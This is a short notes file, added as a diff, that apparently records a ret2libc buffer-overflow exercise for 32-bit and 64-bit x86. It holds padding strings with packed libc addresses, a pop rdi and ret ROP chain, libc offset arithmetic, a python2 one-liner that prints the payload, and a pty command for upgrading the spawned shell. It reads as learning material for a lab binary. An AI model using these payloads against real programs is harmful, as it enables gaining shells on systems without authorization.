@@ -1,0 +1,39 @@
+32-bit:
+
+junk (?) + new return address (32 bits) + junk (32 bits) + argument (32 bits)
+
+
+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa' + '\xc0\xc8\xc4\xf7' + '\x90\x90\x90\x90' + '\xc8\x5f\xdb\xf7' 
+
+new return address = 0xf7c00000 + 0x0004c8c0 = 0xf7c4c8c0
+
+junk = 0x90909090 (just nops)
+
+argument = 0xf7c00000 + 0x001b5fc8 = 0xf7db5fc8
+
+note base of libc is 0xf7c00000 in this case without aslr (though on my system even with aslr it does not randomize this address)
+
+to give a more interactive shell use python -c 'import pty;pty.spawn("/bin/bash");'
+
+64-bit:
+
+same as 32 bit except we need to add a pop rdi instruction since the convention for x86-64 is arguments are stored in the registers, so make return address
+pop rdi (note apparently you need to add an extra return for the sake of stack alignment issues that will occur in the system function, atleast in my case,
+this is caused by the movaps instruction, it is convention that before a function call the stack pointer be 16 bit aligned, more info here: https://ropemporium.com/guide.html#Common%20pitfalls)
+
+not that lib.so base address is 0x00007ffff7dc9000
+
+/bin/sh = 0x00007ffff7dc9000 + 0x000000000019604f = 0x00007ffff7f5f04f
+
+system = 0x00007ffff7dc9000 + 0x000000000004c990 = 0x00007ffff7e15990
+
+pop rdi address = 0x000000000040120b
+
+ret = 0x0000000000401016
+
+junk + ret + pop rdi address + rdi value (/bin/sh) + system return address
+
+python2 -c "print('aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa' + '\x16\x10\x40\x00\x00\x00\x00\x00' + '\x0b\x12\x40\x00\x00\x00\x00\x00' + '\x4f\xf0\xf5\xf7\xff\x7f\x00\x00' + '\x90\x59\xe1\xf7\xff\x7f\x00\x00')"
+
+0x00007ffff7e158c0
+
